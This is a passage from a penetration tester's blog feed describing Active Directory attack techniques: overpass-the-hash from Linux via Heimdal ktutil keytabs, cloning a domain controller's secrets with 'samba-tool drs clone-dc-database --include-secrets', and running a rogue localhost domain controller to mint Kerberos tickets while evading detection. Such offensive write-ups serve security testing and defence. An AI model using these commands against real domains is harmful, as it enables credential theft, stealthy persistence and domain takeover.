href=&quot;https://2.bp.blogspot.com/-HXSCXg5kykE/V1CiY1UiuOI/AAAAAAAAARQ/ulbvGWoC1yg4sBF5G8gGKbVb9jHuveE9QCLcB/s1600/Untitled.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;214&quot; src=&quot;https://2.bp.blogspot.com/-HXSCXg5kykE/V1CiY1UiuOI/AAAAAAAAARQ/ulbvGWoC1yg4sBF5G8gGKbVb9jHuveE9QCLcB/s640/Untitled.jpg&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Fairly straightforward. &amp;nbsp;The config claims to be DC1, and starts up a bunch of services. &amp;nbsp;For what we need, I&#39;m going to turn off stuff that will likely be noisy. &amp;nbsp;For example, I don&#39;t want our Concierge to replicate anything. &amp;nbsp;So I&#39;ll remove both &#39;wrepl&#39; and &#39;drepl&#39; from the list. &amp;nbsp;I&#39;ll also nuke &#39;dnsupdate&#39; and &#39;nbt&#39; (netbios over tcp/ip) since DNS might try to update and netbios is noisy as hell...&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;I also want to bind the instance to localhost. &amp;nbsp;This actually requires a couple of lines because just saying &#39;use this interface&#39; isn&#39;t enough, you have to put in &#39;no really I mean it&#39; as well :/ &amp;nbsp;The two lines that get added to the &#39;global&#39; section are &#39;interfaces = lo&#39; and &#39;bind interfaces only = yes&#39;. So here is my finished config.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://1.bp.blogspot.com/-wEuxwrEnAlo/V1CkZ-QS4_I/AAAAAAAAARc/yH4_gvo_YUgNQk1uV0KWuXW8IZPQ4CnZgCLcB/s1600/final_config.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;314&quot; src=&quot;https://1.bp.blogspot.com/-wEuxwrEnAlo/V1CkZ-QS4_I/AAAAAAAAARc/yH4_gvo_YUgNQk1uV0KWuXW8IZPQ4CnZgCLcB/s640/final_config.jpg&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;So I now start up samba with &#39;samba -s /root/tmp/dc_copy/etc/smb.conf&#39; and see what complains.... &amp;nbsp;I try using the user1 hash to authenticate to get information about user1 using the &#39;net&#39; command.&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://4.bp.blogspot.com/-dU-Ov6j6qiA/V1CmQjP7IJI/AAAAAAAAARw/crb7r0ybtggC0hrwx1QxN4cNGiOUx3xcgCLcB/s1600/fail-0.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;80&quot; src=&quot;https://4.bp.blogspot.com/-dU-Ov6j6qiA/V1CmQjP7IJI/AAAAAAAAARw/crb7r0ybtggC0hrwx1QxN4cNGiOUx3xcgCLcB/s640/fail-0.jpg&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;And it fails. &amp;nbsp;Ok something isn&#39;t happy. &amp;nbsp;Let&#39;s look at the logs...&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://2.bp.blogspot.com/-ZVAC0FQDg3M/V1CmYK7B-XI/AAAAAAAAAR4/Y-c7ER-yPWUW5ZT4j-fZ4SqPkqQceh9kgCLcB/s1600/fail-1.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;190&quot; src=&quot;https://2.bp.blogspot.com/-ZVAC0FQDg3M/V1CmYK7B-XI/AAAAAAAAAR4/Y-c7ER-yPWUW5ZT4j-fZ4SqPkqQceh9kgCLcB/s640/fail-1.jpg&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;So winbindd is complaining about not having a local password to add. &amp;nbsp;So I do a little digging and discover that I need to add something to &#39;private/secrets.tdb&#39; for the machine password. &amp;nbsp;I create a dummy password and insert the key using &#39;tdbtool&#39;, kill / restart samba and try again...&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://2.bp.blogspot.com/-LyeKo7zCAig/V1CntFAX9dI/AAAAAAAAASM/JA0gUyws3i8EK4Df9gYBrapn6LlrhRl6wCLcB/s1600/working-1.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;110&quot; src=&quot;https://2.bp.blogspot.com/-LyeKo7zCAig/V1CntFAX9dI/AAAAAAAAASM/JA0gUyws3i8EK4Df9gYBrapn6LlrhRl6wCLcB/s640/working-1.jpg&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;Holy !@$!@# it worked! &amp;nbsp;Now, let&#39;s see if we can coax it to give us a ticket for kerberos... &amp;nbsp;In order to do this, I make a slight change to the krb5.conf file. &amp;nbsp;I changed the KDC from dc1 to 127.0.0.1.&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://3.bp.blogspot.com/-nHGiO9NlKQ4/V1Cq69CJJxI/AAAAAAAAASo/PXxbglCC4ecvtm-08evvaciB_VU64V6owCLcB/s1600/newkrb5.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;352&quot; src=&quot;https://3.bp.blogspot.com/-nHGiO9NlKQ4/V1Cq69CJJxI/AAAAAAAAASo/PXxbglCC4ecvtm-08evvaciB_VU64V6owCLcB/s640/newkrb5.jpg&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;From here, I do the &#39;kinit&#39; using the previously generated keytab. &amp;nbsp;And voila! I get a ticket from our own personal Concierge....&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://1.bp.blogspot.com/-At4c220tS90/V1CrOlChgyI/AAAAAAAAASw/5eDlWPjOLUwaDo0366SkZn2QHQtgei06ACLcB/s1600/kinit%2B-%2Bklist%2B-%2Bworking.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;114&quot; src=&quot;https://1.bp.blogspot.com/-At4c220tS90/V1CrOlChgyI/AAAAAAAAASw/5eDlWPjOLUwaDo0366SkZn2QHQtgei06ACLcB/s640/kinit%2B-%2Bklist%2B-%2Bworking.jpg&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;And here&#39;s the wireshark capture showing that the traffic went across localhost&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://3.bp.blogspot.com/-u0bbLkN9G6s/V1CrXlUOV5I/AAAAAAAAAS4/hJoWNsqx9vkout6cW1jFgkD4SddSZw2JQCLcB/s1600/wireshark-1.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;146&quot; src=&quot;https://3.bp.blogspot.com/-u0bbLkN9G6s/V1CrXlUOV5I/AAAAAAAAAS4/hJoWNsqx9vkout6cW1jFgkD4SddSZw2JQCLcB/s640/wireshark-1.jpg&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;So what happens if we try to use this ticket to authenticate to DC1? &amp;nbsp;On the localhost side, we get a request for a service ticket, which is to be expected. &lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://2.bp.blogspot.com/-PICdHLt8fT4/V1CtXWmaWQI/AAAAAAAAATE/0QMDK_X6zXA6pfcNzGHgscU5caSTyrpJwCLcB/s1600/tgs-request-local.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;176&quot; src=&quot;https://2.bp.blogspot.com/-PICdHLt8fT4/V1CtXWmaWQI/AAAAAAAAATE/0QMDK_X6zXA6pfcNzGHgscU5caSTyrpJwCLcB/s640/tgs-request-local.jpg&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;On the 10 side we see that there is a pause between the DNS query for the address and the SMB connection. &amp;nbsp;This is where the Concierge was asked about giving us access to the CIFS share on the domain controller.&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://2.bp.blogspot.com/-LIf2GVWPnzw/V1CtptL3y_I/AAAAAAAAATY/qNjA_N4L1JIe1eyVHYs1LkOAj59uyH-TgCKgB/s1600/dc-traffic.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;284&quot; src=&quot;https://2.bp.blogspot.com/-LIf2GVWPnzw/V1CtptL3y_I/AAAAAAAAATY/qNjA_N4L1JIe1eyVHYs1LkOAj59uyH-TgCKgB/s640/dc-traffic.jpg&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;/div&gt;&lt;br /&gt;Here&#39;s the list of the tickets we ended up with.&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://2.bp.blogspot.com/-fUWCR6mLy1o/V1CulfxGDcI/AAAAAAAAATk/OQJbtDYW1_Q2Y-1pgJqyHGxCFil9iC0GACLcB/s1600/final-klist-with-service.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;400&quot; src=&quot;https://2.bp.blogspot.com/-fUWCR6mLy1o/V1CulfxGDcI/AAAAAAAAATk/OQJbtDYW1_Q2Y-1pgJqyHGxCFil9iC0GACLcB/s640/final-klist-with-service.jpg&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;So like a true professional, our Concierge got us tickets to whatever we wanted without complaining ;-)&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;Ramifications&lt;/h2&gt;&lt;div&gt;Ok. &amp;nbsp;So this is cute, so what? &amp;nbsp;Why should somebody care about this?&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Well... aside from the fact that I now have a Domain Controller that I can authenticate against that the other side has no visibility into, this is sort of the penultimate demonstration of domain compromise. &amp;nbsp;Standing up your own domain controller for their environment. &amp;nbsp;Unless they are looking for / logging replication traffic, they would have no idea WTF is going on. &amp;nbsp;I *believe* that some of the next generation detection capabilities depend on being able to watch authentication traffic on the DC, so not authenticating against that would cause some serious problems detection wise.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;Other Thoughts / Ideas&lt;/h2&gt;&lt;div&gt;Right now this is a localhost only copy of the database. &amp;nbsp;It would be entertaining to see if this could be extended so that other people / VMs could authenticate against this on an assessment. &amp;nbsp;Getting this working on the *NIX side should be straight forward. &amp;nbsp;I REALLY want to see if I can get my Windows attack platform to authenticate to it. &amp;nbsp;That aught to be fun... &amp;nbsp;We&#39;ll see how this goes...&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/1829999442570489175/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2016/06/im-pkdc-your-personal-kerberos-domain.html#comment-form' title='3 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/1829999442570489175'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/1829999442570489175'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2016/06/im-pkdc-your-personal-kerberos-domain.html' title='I&#39;m PKDC, your Personal Kerberos Domain Concierge for the Whatever_domain'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://2.bp.blogspot.com/-HXSCXg5kykE/V1CiY1UiuOI/AAAAAAAAARQ/ulbvGWoC1yg4sBF5G8gGKbVb9jHuveE9QCLcB/s72-c/Untitled.jpg" height="72" width="72"/><thr:total>3</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-1564899024523429729</id><published>2016-06-01T16:08:00.001-07:00</published><updated>2016-06-01T16:10:46.723-07:00</updated><title type='text'>*NIX Kerberos + MS Active Directory fun and games</title><content type='html'>So one of my favorite techniques on the Windows side is to use what Benjamin Delpy (@gentilkiwi) called &#39;overpass the hash&#39; to get a legit Kerberos ticket from a KDC once I&#39;ve fully compromised the domain. &amp;nbsp;This technique requires the use of a password hash (hence the need for domain compromise, although you could simply have gotten somebody&#39;s password as well).&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;Quick Review of Overpass-the-hash&lt;/h2&gt;&lt;br /&gt;In case you don&#39;t remember, the way that you get a TGT (ticket granting ticket) in Active Directory is via a process called &#39;pre-authentication&#39;. &amp;nbsp;Essentially the way this works is you take a timestamp (hence the requirement that the time be synced with domain controllers) and encrypt it with the user&#39;s shared secret (the password hash) and send it off to the Domain Controller. &amp;nbsp;The DC will verify the blob by decrypting it with the copy of the key the DC has and seeing if the resulting timestamp fits in the window of time configured. Assuming that all is well, the DC will send the client a TGT.&lt;br /&gt;&lt;br /&gt;So, in essence, to get a TGT you need 1) correct time 2) username 3) key for username 4) name of DC / domain. &amp;nbsp;Ben&#39;s &#39;overpass the hash&#39; method uses Mimikatz to set the hash/user/domain in memory on a Windows box. &amp;nbsp;Then when you request a service using that credential, Windows will automagically ask for the TGT and any subsequent service tickets. &amp;nbsp;Sometimes it is a bit fiddly to get the right Kerberos information to make it work since some places prefer to use the netbios name everywhere, but it&#39;s not too hard to figure out if you have enumerated the domain controllers.&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;Kerberos and *NIX&lt;/h2&gt;Kerberos is a central authentication service that started on *NIX and is currently being used by several organizations in various flavors. &amp;nbsp;Integrating *NIX Kerb with AD has always been challenging as some of the changes to MS Kerb are different than the traditional Kerb implementations on the *NIX side.&lt;br /&gt;&lt;br /&gt;There are 2 primary implementations of *NIX Kerb, MIT and Heimdal. &amp;nbsp;Both are in use today. &amp;nbsp;MIT is considered the more stable while Heimdal is considered the most progressive. &amp;nbsp;Samba generally prefers Heimdal for its Kerb interactions.&lt;br /&gt;&lt;br /&gt;Recently I&#39;ve had several clients who had large integrations of *NIX machines within their AD environment using a product called Centrify (https://www.centrify.com/). &amp;nbsp;This allows users to sign into *NIX hosts with their Windows credentials using Kerberos via SSH. &amp;nbsp;Essentially the *NIX boxes become domain joined and there are some interesting things you can do, such as push out Group Policy Objects (GPOs) to the *NIX machines.&lt;br /&gt;&lt;br /&gt;So the issue I ran into was, since I popped the domain, how can I leverage this to log into the *NIX environment? &amp;nbsp;I have all this Windows Kerberos functionality thanks to Mimikatz. &amp;nbsp;How can I make it work with *NIX?&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;Quick Into to *NIX Kerberos Commands&lt;/h2&gt;&lt;div&gt;Getting Kerberos up and going quickly on Kali (Debian base) is fairly straight forward. &amp;nbsp;I&#39;m going to recommend using Heimdal rather than MIT based on experiences. &amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Simply &quot;apt-get install heimdal-clients&quot; and it should pull in a all the required dependencies. &amp;nbsp;We aren&#39;t quite done yet, however.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;First, you need to point your name resolution to the domain controller. &amp;nbsp;There&#39;s a lot of magic that gets figured out with Kerberos and DNS, so pointing the resolv.conf to the DC just makes life easier. &amp;nbsp;Trust me.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Secondly, you need a working &#39;/etc/krb5.conf&#39;. &amp;nbsp;I managed to &lt;strike&gt;steal&lt;/strike&gt;&amp;nbsp;re-purpose one from a working Centrify config. &amp;nbsp;It is worth noting that you need to get the case correct here. &amp;nbsp;Kerberos realms are capitalized. &amp;nbsp;It took me forever to re-learn this, so you&#39;ve been warned. &amp;nbsp;I recommend starting with a known good / working configuration and then modify to suit your needs. &amp;nbsp; &amp;nbsp;Here it is from my internal &#39;exploits.com&#39; domain in the lab (Windows 2008R2 domain at 2008R2 functional level):&lt;/div&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;[libdefaults]&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&amp;nbsp;default_realm = EXPLOITS.COM&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&amp;nbsp;default_tgs_enctypes = aes256-cts aes128-cts arcfour-hmac-md5 des-cbc-md5 des-cbc-crc&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&amp;nbsp;default_tkt_enctypes = aes256-cts aes128-cts arcfour-hmac-md5 des-cbc-md5 des-cbc-crc&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&amp;nbsp;permitted_enctypes = aes256-cts aes128-cts arcfour-hmac-md5 des-cbc-md5 des-cbc-crc&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&amp;nbsp;dns_lookup_realm = true&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&amp;nbsp;dns_lookup_kdc = true&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&amp;nbsp;passwd_check_s_address = false&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&amp;nbsp;noaddresses = true&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;udp_preference_limit = 1&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&amp;nbsp;ccache_type = 3&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&amp;nbsp;kdc_timesync = 0&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&amp;nbsp;kdc_timesync = 0&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;[domain_realm]&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&amp;nbsp;dc1.exploits.com = EXPLOITS.COM&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&amp;nbsp;.exploits.com = EXPLOITS.COM&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&amp;nbsp;exploits.com = EXPLOITS.COM&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;[realms]&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;EXPLOITS.COM = {&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&amp;nbsp;kdc = dc1.exploits.com:88&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&amp;nbsp;master_kdc = dc1.exploits.com:88&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&amp;nbsp;kpasswd = dc1.exploits.com:464&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;&amp;nbsp;kpasswd_server = dc1.exploits.com:464&lt;/blockquote&gt;&lt;blockquote class=&quot;tr_bq&quot;&gt;}&lt;/blockquote&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Logging into a Kerberos domain is fairly straight forward. &amp;nbsp;Assuming that you have everything configured correctly, you issue the command &#39;kinit user1@EXPLOITS.COM&#39;. &amp;nbsp;It will prompt you for a password. &amp;nbsp;Then if it is successful, it will simply return you to a command prompt. &amp;nbsp;To see if you actually got a ticket, use the command &#39;klist&#39;. &amp;nbsp;If everything went smoothly, then your output aught to look something like this:&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://3.bp.blogspot.com/-lcZcBsaBff0/V09SaI5JcCI/AAAAAAAAAPQ/J7bjmJGNilEvW-iizmMa5fFIciuHwxm5gCLcB/s1600/kinit-klist.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;https://3.bp.blogspot.com/-lcZcBsaBff0/V09SaI5JcCI/AAAAAAAAAPQ/J7bjmJGNilEvW-iizmMa5fFIciuHwxm5gCLcB/s1600/kinit-klist.jpg&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;You can also get a &#39;verbose&#39; listing of the information in the ticket by sending the &#39;-v&#39; flag to klist.&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://4.bp.blogspot.com/-ByH1BNZM4tk/V09To4H6r1I/AAAAAAAAAPc/5_lJGVywQNo_jPLceFbQq1VwekPuPBXCgCLcB/s1600/klist-v.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;https://4.bp.blogspot.com/-ByH1BNZM4tk/V09To4H6r1I/AAAAAAAAAPc/5_lJGVywQNo_jPLceFbQq1VwekPuPBXCgCLcB/s1600/klist-v.jpg&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;div&gt;The Kerberos tickets are stores in a file in /tmp called &#39;krb5cc_0&#39; in a *NIX Kerberos format called CCACHE. &amp;nbsp;The number at the end is the UID of the currently logged in user. &amp;nbsp;If you are on a multi-user system you may see several files in /tmp with different UIDs. &amp;nbsp;Keep in mind that Kerberos tickets are portable..... (and if you are root, easy to grab files with multiple tickets potentially in them) ;-)&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Once you have a TGT you can generally simply use the &#39;-k&#39; flag with any of the samba utilities to log into Windows assets using the Kerberos ticket rather than credentials. &amp;nbsp;You don&#39;t even need to specify a username either, since that&#39;s all in the ticket. &amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;Round Uno&lt;/h2&gt;Initially when faced with logging into the *NIX assets I hadn&#39;t figured out a good way of leveraging the keys I had recovered from the AD compromise to move into the *NIX assets. &amp;nbsp;So I&#39;m going to briefly describe what I did, however, there is a much simpler / cleaner way now, so I&#39;m not going to give too much detail here.&lt;br /&gt;&lt;br /&gt;Essentially I started with the overpass-the-hash from above and then exported the tickets using Mimikatz. From here, I converted the TGT from the .kirbi format into the .ccache format by using another tool from Ben called kekeo. &amp;nbsp;I copied the resulting file over to my Kali box as &#39;/tmp/krb5cc_0&#39; and voila, I now had a TGT I could then work with. &amp;nbsp;However, this is a multi-step process and a serious pain in the genitals, so I wanted to try to find a cleaner way, and in the end discovered something much much cooler...&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;Round Two.... FIGHT!&lt;/h2&gt;&lt;div&gt;After digging through the Heimdal code and asking Ben some questions on twitter, he pointed me to a utility I wasn&#39;t aware of called &#39;ktutil&#39;. &amp;nbsp;This utility is used to manage &#39;keytab&#39; files, which can include actual keys. &amp;nbsp;I have keys, lots of them in fact from a domain compromise, it can&#39;t be that easy, can it?&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Yup.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;This is using Heimdal. &amp;nbsp;Use Heimdal. &amp;nbsp;The &#39;ktutil&#39; on MIT is interactive and is much more painful to use. &amp;nbsp;Hence my recommendation to use Heimdal. &amp;nbsp;Heimdal. &amp;nbsp;Heimdal.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;From my Twitter post:&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;https://1.bp.blogspot.com/-1LJp0BaHRe4/V09W9mg4inI/AAAAAAAAAP4/9wzgJSUhYXcFO65s3XqYWJgeagh02g3iACLcB/s1600/kali-exp-2016-05-29-17-35-03.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;248&quot; src=&quot;https://1.bp.blogspot.com/-1LJp0BaHRe4/V09W9mg4inI/AAAAAAAAAP4/9wzgJSUhYXcFO65s3XqYWJgeagh02g3iACLcB/s640/kali-exp-2016-05-29-17-35-03.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;So you can specify a file to use as the keytab (-k) the username (Principal in Kerb lingo) , the encryption type (arcfour-hmac-md5 is used for NTLM auth), the password (-w &amp;lt;hash&amp;gt;) , specify that the password is actually a key in hex (--hex) and the version a capital V (-V 5). &amp;nbsp;Now I used 5 thinking that this is kerberos 5, but this version might be some other version, so I&#39;m not entirely sure. &amp;nbsp;YMMV.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Then when you use kinit, you specify the keytab file to use (-t) and then magic happens. &amp;nbsp;You end up with a TGT. MUHAHAHAHAH. &amp;nbsp;Overpass-the-hash with Kerberos using native tools. &amp;nbsp;I feel really silly for not having figured this out sooner. &amp;nbsp;Seriously. &amp;nbsp;However, digging into it a little more, I found something much much cooler, if you can imagine that.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;Round Three - Dude, You&#39;re Screwed!&lt;/h2&gt;&lt;div&gt;So whilst I was digging around, I thought about trying to automate using the keytab to just store all the keys for the domain and simply pick which one I wanted based on what I needed at the time. &amp;nbsp;So I approached the problem from the direction of maybe writing a script to automate dumping all the keys into a keytab. &amp;nbsp;I was poking around when I found something magical.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;You can actually coax Samba to do all the work for you! &amp;nbsp;For every key in AD for every user / computer. &amp;nbsp;With built-in tools. From a non-domain-joined computer.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;So, as it turns out the newer versions of Samba have the ability to replicate from a domain controller and then you can convert that into a huge keytab.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;To use this &#39;feature&#39; you need a newer version of Samba. &amp;nbsp;This means compiling from scratch. &amp;nbsp;Beyond the scope of what I&#39;m writing about here, but it wasn&#39;t hard. &amp;nbsp;Couple annoying dependencies and some multi-core compiling later I have a new build in /opt/smb.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;This magical command is called &#39;samba-tool&#39;. &amp;nbsp;You can use it to replicate a remote DC (with an admin user of course) and it will dump the contents to a directory of your choosing. &amp;nbsp;Plus you can use Kerberos, so you can simply use an existing ticket you received from OPTH. ;-)&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;You need to invoke samba-tool thusly (Note, this is what worked in my lab, might be fiddly, YMMV):&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;i&gt;samba-tool drs clone-dc-database --include-secrets --targetdir=&amp;lt;dir&amp;gt; &amp;lt;DOMAIN in CAPS&amp;gt; -k1&amp;nbsp;&lt;/i&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;You need to specify &#39;targetdir&#39; and the domain obviously. &amp;nbsp;The &#39;-k1&#39; tells it to use kerberos. &amp;nbsp;My test domain has a large number of objects (computers / users/ groups ) that I created using Joeware&#39;s admod to give it some size.&lt;/div&gt;&lt;div&gt;&lt;br 